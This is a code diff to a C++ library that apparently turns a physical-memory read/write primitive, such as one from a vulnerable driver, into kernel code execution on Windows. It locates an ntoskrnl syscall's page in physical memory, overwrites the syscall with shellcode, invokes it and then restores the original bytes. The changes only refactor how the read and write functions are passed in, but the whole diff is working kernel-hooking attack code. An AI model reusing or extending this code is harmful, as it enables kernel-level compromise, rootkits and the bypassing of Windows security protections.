@@ -1,10 +1,13 @@
-#include "vdm_ctx.h"
+#include "vdm_ctx.hpp"
 
 namespace vdm
 {
-	vdm_ctx::vdm_ctx()
+	vdm_ctx::vdm_ctx(read_phys_t& read_func, write_phys_t& write_func)
+		:
+		read_phys(read_func),
+		write_phys(write_func)
 	{
-		// if we already found the syscall's physical page...
+		// already found the syscall's physical page...
 		if (vdm::syscall_address.load())
 			return;
 
@@ -13,7 +16,7 @@ namespace vdm
 				DONT_RESOLVE_DLL_REFERENCES));
 
 		nt_rva = reinterpret_cast<std::uint32_t>(
-			util::get_kernel_export(
+			util::get_kmodule_export(
 				"ntoskrnl.exe",
 				syscall_hook.first,
 				true
@@ -34,9 +37,19 @@ namespace vdm
 			search_thread.join();
 	}
 
+	void vdm_ctx::set_read(read_phys_t& read_func)
+	{
+		this->read_phys = read_func;
+	}
+
+	void vdm_ctx::set_write(write_phys_t& write_func)
+	{
+		this->write_phys = write_func;
+	}
+
 	void vdm_ctx::locate_syscall(std::uintptr_t address, std::uintptr_t length) const
 	{
-		const auto page_data = 
+		const auto page_data =
 			reinterpret_cast<std::uint8_t*>(
 				VirtualAlloc(
 					nullptr,
@@ -49,11 +62,8 @@ namespace vdm
 			if (vdm::syscall_address.load())
 				break;
 
-			if (!vdm::read_phys(reinterpret_cast<void*>(address + page), page_data, PAGE_4KB))
-			{
-				std::printf("[+] failed to read phys...\n");
+			if (!read_phys(reinterpret_cast<void*>(address + page), page_data, PAGE_4KB))
 				continue;
-			}
 
 			// check the first 32 bytes of the syscall, if its the same, test that its the correct
 			// occurrence of these bytes (since dxgkrnl is loaded into physical memory at least 2 times now)...
@@ -63,7 +73,6 @@ namespace vdm
 						reinterpret_cast<void*>(
 							address + page + nt_page_offset));
 		}
-
 		VirtualFree(page_data, PAGE_4KB, MEM_DECOMMIT);
 	}
 
@@ -84,11 +93,11 @@ namespace vdm
 		std::uint8_t orig_bytes[sizeof shellcode];
 
 		// save original bytes and install shellcode...
-		vdm::read_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
-		vdm::write_phys(syscall_addr, shellcode, sizeof shellcode);
+		read_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
+		write_phys(syscall_addr, shellcode, sizeof shellcode);
 
 		auto result = reinterpret_cast<NTSTATUS(__fastcall*)(void)>(proc)();
-		vdm::write_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
+		write_phys(syscall_addr, orig_bytes, sizeof orig_bytes);
 		syscall_mutex.unlock();
 		return result == STATUS_SUCCESS;
 	}
